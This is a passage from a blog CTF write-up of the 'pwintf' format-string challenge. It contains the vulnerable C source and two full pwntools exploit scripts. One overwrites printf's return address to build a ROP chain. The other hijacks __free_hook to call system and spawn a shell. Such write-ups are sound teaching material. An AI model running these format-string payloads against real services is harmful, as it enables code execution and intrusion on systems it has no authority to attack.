+<p><strong>flag</strong>: maple{youwe_weady_fow_the_big_boy_chawwenge}</p>
+<h1 id="0x4-Example-pwintf"><a href="#0x4-Example-pwintf" class="headerlink" title="0x4 Example pwintf"></a>0x4 Example pwintf</h1><p>Now, we understand the basic of printf. Lets do some challenge</p>
+<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Full RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="Quick-look"><a href="#Quick-look" class="headerlink" title="Quick look"></a>Quick look</h2><p>lets take a quick look at the source code. There is a trivial vulnerability here - <code>printf(input)</code>.</p>
+<p>Before exploit the binary, there still some problem we need to find solution</p>
+<ol>
+<li>Since the input is locate at heap. We can&#39;t write arbitrary data into the stack. </li>
+<li>the program didn&#39;t provide a way to exist the while loop. And there is no ret instruction in the vuln function</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln() &#123;</span><br><span class="line">    puts(&quot;Wewcome b-back?!! Peopwe wewe t-twying t-to hack my pwogwam, so I stopped putting the x3 fwag in memowy ÚwÚ&quot;);</span><br><span class="line">    while(1) &#123;</span><br><span class="line">        char* input = malloc(0x100);</span><br><span class="line"></span><br><span class="line">        fgets(input, 0x100, stdin);</span><br><span class="line"></span><br><span class="line">        printf(input);</span><br><span class="line"></span><br><span class="line">        free(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    alarm(60);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>So, want can we do. There are two solution (maybe there is more but I only know two)</p>
+<ol>
+<li>change the rip of printf and then construct a rop chain to call one gadget</li>
+<li>write rop chain to free_hook</li>
+</ol>
+<h2 id="change-rip-of-printf-unintended"><a href="#change-rip-of-printf-unintended" class="headerlink" title="change rip of printf (unintended)"></a>change rip of printf (unintended)</h2><p>if we look at the stack before call program call printf. We can see that the address of printf rip is just 8 bytes above the vuln stack. </p>
+<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-03_170338.jpg" alt="2022-02-03_170338.jpg"></p>
+<p>So, if we can find a way to overwrite this rip, we can use this rip to construct a rop chain.</p>
+<p>Lets summarize the idea of this method</p>
+<ol>
+<li>first, find a memory block in the stack, make that block point to the rip of printf</li>
+<li>use printf with %n, change the address of rip</li>
+<li>when printf finish. It will fall into the rop chain and spawn a shell.</li>
+</ol>
+<p>With these step in mind, After looking at the stack, I came up with a solution.</p>
+<p><em>because i&#39;m lazy, so i choose the address on the stack so that I only need to write at most 4 bytes</em></p>
+<ol>
+<li>change the value of (rsp+35*0x8) to (rsp + 5*0x8) using (rsp + 7*0x8)</li>
+<li>change the value of (rsp+5*0x8) to one gadget address using (rsp+35*0x8)</li>
+<li>change the value of (rsp+35*0x8) to (rsp - 0x8) using (rsp + 7*0x8)</li>
+<li>change the value of (rsp - 0x8) to rop chain gadget address using (rsp+35*0x8)</li>
+<li>use pop_rbp_r12_r13_r14_r15_ret as the the rop chain gadget, pop all unnecessary value on the stack and return to one gadget address in (rsp+5*0x8)</li>
+</ol>
+<h3 id="exploit-py"><a href="#exploit-py" class="headerlink" title="exploit.py"></a>exploit.py</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;pwintf&quot;</span><br><span class="line">    libc = &quot;libc.so.6&quot;</span><br><span class="line">    # libc = &quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;&quot;</span><br><span class="line">    port = 32011</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Full RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line"># ======== gadget stuff =========</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== libc stuff =========</span><br><span class="line">libc_bin_sh_offset = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">log_print(&quot;libc /bin/sh offset&quot;, hex(libc_bin_sh_offset))</span><br><span class="line">libc_printf_offset = libc.sym[&quot;printf&quot;]</span><br><span class="line">log_print(&quot;libc printf offset&quot;, hex(libc_printf_offset))</span><br><span class="line">libc_system_offset = libc.sym[&quot;system&quot;]</span><br><span class="line">log_print(&quot;libc system offset&quot;, hex(libc_system_offset))</span><br><span class="line">libc_start_main_ret_offset = libc.libc_start_main_return</span><br><span class="line">log_print(&quot;libc_start_main_ret_offset&quot;, hex(libc_start_main_ret_offset))</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">lp = log_print</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line">def read_stack_at(offset):</span><br><span class="line">    io.sendline(b&quot;%%%d$p&quot;%(offset+6))</span><br><span class="line">    a = io.recvuntil(b&quot;0x&quot;)</span><br><span class="line">    return int(io.recv()[:-1:],16) &amp; 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">def read_data_at(offset):</span><br><span class="line">    io.sendline(b&quot;%%%d$x&quot;%(offset+6))</span><br><span class="line">    a = io.recvuntil(b&quot;0x&quot;)</span><br><span class="line">    return int(io.recv()[:-1:],16) &amp; 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">def write_stack_at(offset,data,number_of_bytes):</span><br><span class="line">    byte_format = b&quot;n&quot;</span><br><span class="line">    if number_of_bytes == 2:</span><br><span class="line">        byte_format = b&#x27;hn&#x27;</span><br><span class="line">    if number_of_bytes == 1:</span><br><span class="line">        byte_format = b&#x27;hhn&#x27;</span><br><span class="line">    io.sendline(b&quot;%%%dx%%%d$%s|IENDL&quot;%(data,offset+6,byte_format))</span><br><span class="line">    io.recvuntil(b&#x27;IENDL&#x27;)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">soffset_to_stack_35 = 7</span><br><span class="line">soffset_stack_35 = 35</span><br><span class="line">soffset_stack_vuln_rip = 3</span><br><span class="line">soffset_libc_start_main_ret = 5</span><br><span class="line"></span><br><span class="line"># lp(&quot;free hook addr&quot;,hex(libc.sym[&quot;__free_hook&quot;]))</span><br><span class="line"></span><br><span class="line">lp(io.recv())</span><br><span class="line"></span><br><span class="line">current_rsp_addr = read_stack_at(0) - 0x20</span><br><span class="line">lp(&quot;current rsp addr&quot;, hex(current_rsp_addr))</span><br><span class="line"># address of mov eax,0 at sym.main</span><br><span class="line">program_base_addr = read_stack_at(soffset_stack_vuln_rip) - (exe.sym[&quot;main&quot;] + 0x44)</span><br><span class="line">lp(&quot;program base addr&quot;, hex(program_base_addr))</span><br><span class="line">libc_base_addr = read_stack_at(soffset_libc_start_main_ret) - libc_start_main_ret_offset</span><br><span class="line">lp(&quot;libc base addr&quot;, hex(libc_base_addr))</span><br><span class="line">lp(&quot;/bin/sh&quot;, hex(libc_base_addr+libc_bin_sh_offset))</span><br><span class="line">pop_3_stack_ret_addr = program_base_addr + 0x131f</span><br><span class="line">pop_rbp_r12_r13_r14_r15_ret_addr = program_base_addr + 0x131b</span><br><span class="line">lp(&quot;pop_3_stack_ret_addr&quot;, hex(pop_3_stack_ret_addr))</span><br><span class="line">lp(&quot;pop_rbp_r12_r13_r14_r15_ret_addr&quot;, hex(pop_rbp_r12_r13_r14_r15_ret_addr))</span><br><span class="line"></span><br><span class="line">printf_rip_addr = current_rsp_addr - 0x8</span><br><span class="line">lp(&quot;printf rip addr&quot;, hex(printf_rip_addr))</span><br><span class="line"></span><br><span class="line"># one gadget r15,rdx == null</span><br><span class="line">one_gadget_addr = libc_base_addr + 0xe6c81</span><br><span class="line">lp(&quot;one gadget addr&quot;,hex(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">stack_libc_start_main_ret_addr = current_rsp_addr + soffset_libc_start_main_ret * 0x8</span><br><span class="line">write_stack_at(soffset_to_stack_35,(stack_libc_start_main_ret_addr) &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_stack_35, one_gadget_addr &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_to_stack_35,(stack_libc_start_main_ret_addr+0x2) &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_stack_35, (one_gadget_addr &gt;&gt; 16) &amp; 0xffff,2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_stack_at(soffset_to_stack_35, printf_rip_addr &amp; 0xffff,2)</span><br><span class="line"># read_stack_at(soffset_stack_35)</span><br><span class="line">write_stack_at(soffset_stack_35, pop_rbp_r12_r13_r14_r15_ret_addr &amp; 0xffff,2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="write-rop-to-chain-to-free-hook-intended-solution"><a href="#write-rop-to-chain-to-free-hook-intended-solution" class="headerlink" title="write rop to chain to free_hook (intended solution)"></a>write rop to chain to free_hook (intended solution)</h2><p>after discuss with the author of the challenge. The intended solution for this one is actually using another debug feature - <strong>free_hook</strong></p>
+<p>So basically, libc have an writable function address called <code>__free_hook</code>. the function will be called every time <code>free()</code> is called. </p>
+<p>Therefore, by write address into <code>__free_hook</code>, we can escape from while loop and get into a rop chain</p>
+<h3 id="exploit-py-1"><a href="#exploit-py-1" class="headerlink" title="exploit.py"></a>exploit.py</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template --host localhost --port 1442 pwintf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;pwintf&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;localhost&#x27;</span><br><span class="line">port = int(args.PORT or 1442)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Full RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">io.sendline(b&quot;%11$p\n%6$p\n%13$p&quot;)</span><br><span class="line"></span><br><span class="line">libc.address = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0) - libc.libc_start_main_return</span><br><span class="line">stack_addr_0 = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0) - 0x20</span><br><span class="line">stack_addr_1 = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0)</span><br><span class="line"></span><br><span class="line">stack_offset = 6 + (stack_addr_1 - stack_addr_0) // 8</span><br><span class="line"></span><br><span class="line">io.info(&quot;Libc: &quot; + hex(libc.address))</span><br><span class="line">io.info(&quot;Stack 0: &quot; + hex(stack_addr_0))</span><br><span class="line">io.info(&quot;Stack 1: &quot; + hex(stack_addr_1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_on_stack(value, offset):</span><br><span class="line">    for i in range(4):</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%13$hn&quot;.format((stack_addr_0 + 8 * (offset - 6) + 2 * i) % 0x10000).encode())</span><br><span class="line">        io.recvline(1)</span><br><span class="line"></span><br><span class="line">        chars = (value // (0x10000 ** i)) % 0x10000</span><br><span class="line">        if chars == 0:</span><br><span class="line">            io.sendline(&quot;%&#123;&#125;$hn&quot;.format(stack_offset).encode())</span><br><span class="line">        else:</span><br><span class="line">            io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format(chars, stack_offset).encode())</span><br><span class="line">        io.recvline(1)</span><br><span class="line"></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;], 8)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 2, 9)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 4, 10)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 6, 11)</span><br><span class="line"></span><br><span class="line">target = libc.sym[&#x27;system&#x27;]</span><br><span class="line">payload = &quot;/bin/bash #&quot;</span><br><span class="line">written = len(payload)</span><br><span class="line"></span><br><span class="line">chars = ((target % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%8$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x10000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%9$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x100000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%10$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x1000000000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%11$hn&quot;</span><br><span class="line"></span><br><span class="line">io.sendline(payload.encode())</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>maple{h0p3_1t_d1dnt_t4k3_l0ng}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/30/life/yao-emo-le-55555/" rel="prev" title="要emo了要 要抑郁了要">
+                  <i class="fa fa-chevron-left"></i> 要emo了要 要抑郁了要
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/08/ctf/why-pixilation-is-bad/" rel="next" title="why pixilation a text is bad">
+                  why pixilation a text is bad <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Aynakeya</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
